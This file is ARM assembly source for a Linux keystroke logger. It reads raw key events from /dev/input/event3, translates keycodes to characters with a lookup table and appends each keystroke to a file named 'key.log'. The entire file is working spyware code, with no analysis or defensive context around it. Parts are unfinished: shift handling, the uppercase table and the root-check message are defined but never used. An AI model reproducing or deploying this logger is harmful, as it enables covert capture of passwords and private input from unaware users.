.global _start

.section .text
_start:
	MOV R7, #5
	LDR R0, =dest
	LDR R1, =02101
	MOV R2, #420
	SWI #0

	MOV R11, R0

	MOV R7, #5
	LDR R0, =source
	MOV R1, #0
	SWI #0

	MOV R12, R0

loop:
	MOV R7, #3
	MOV R0, R12
	LDR R1, =input_event
	MOV R2, #16
	SWI #0

	LDR R0, =input_event
	LDR R0, [R0, #8]

	MOV R1, #0xFF00
	ORR R1, R1, #0xFF
	AND R0, R0, R1

	CMP R0, #0
	BEQ loop

	CMP R0, #4
	BEQ loop

	LDR R0, =input_event
        LDR R0, [R0, #12]

	CMP R0, #0
	BEQ loop

	LDR R0, =input_event
        LDR R0, [R0, #10]
	AND R0, R0, R1

        CMP R0, #42
        BEQ shifter
        B nonshift

shifter:
        LDR R9, =shift
        MOV R8, #1
        STR R8, [R9]
        B loop

nonshift:
	LDR R1, =toASCII
	LDR R0, [R1, R0]

	AND R0, R0, #0xFF
	MOV R10, R0

write:
	LDR R9, =character
	STR R10, [R9]

	MOV R7, #4
	MOV R0, R11
	LDR R1, =character
	MOV R2, #1
	SWI #0

@	MOV R7, #6
@	MOV R0, R11
@	SWI #0

	B loop

_end:
	MOV R0, #0x1010
	MOV R7, #1
	SWI #0

.section .data
	dest: .asciz "key.log"
	source: .asciz "/dev/input/event3"
	toASCII:   .ascii "??1234567890-=\b\tqwertyuiop[]\n?asdfghjkl;'`?\\zxcvbnm,./??? ???????????????????"
		   .ascii "????????????????????????????????????????????????????????????????????????????????"
	upperCase: .ascii "??!@#$%^&*()_+??QWERTYUIOP{}|ASDFGHJKL:\"~?|ZXCVBNM<>?"
	errMsg: .asciz "Error: Program must be ran as root\n"
	lenErrMsg = .-errMsg

	input_event: .fill 16, 1, 0
	character: .byte 0
	shift: .byte 0
